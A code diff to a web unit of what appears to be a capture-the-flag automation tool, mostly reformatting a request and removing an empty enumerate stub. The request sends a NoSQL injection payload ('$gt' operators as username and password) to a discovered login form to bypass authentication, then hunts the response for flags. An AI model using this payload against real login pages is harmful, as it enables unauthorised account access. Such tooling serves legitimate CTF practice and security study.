@@ -50,12 +50,6 @@ class Unit(web.WebUnit):
         if not (self.action and self.method and self.username and self.password):
             raise NotApplicable("no form found")
 
-    def enumerate(self):
-
-        # This should "yield 'name', (params,to,pass,to,evaluate)"
-        # evaluate will see this second argument as only one variable and you will need to parse them out
-
-
     def evaluate(self, case: Any):
 
         # Extract the found values
@@ -75,7 +69,6 @@ class Unit(web.WebUnit):
                 # Could not find a valid method... default to POST
                 method = requests.post
 
-
         # Grab the URL pieces
         url_form = self.target.upstream.decode("utf-8").split("/")
 
@@ -86,14 +79,13 @@ class Unit(web.WebUnit):
             last_location = self.target.upstream.decode("utf-8").rstrip("/") + "/"
 
         try:
-            r = self.session.request(method.lower(),
-                                     last_location+action, json={
-                    "username": {"$gt": ""},
-                    "password": {"$gt": ""},
-                },
+            r = self.session.request(
+                method.lower(),
+                last_location + action,
+                json={"username": {"$gt": ""}, "password": {"$gt": ""},},
                 timeout=2,
                 headers={"User-Agent": web.firefox_browser_user_agent},
-                )
+            )
 
             # Hunt for flags if we have a successful injection!
             katana.locate_flags(self, r.text)
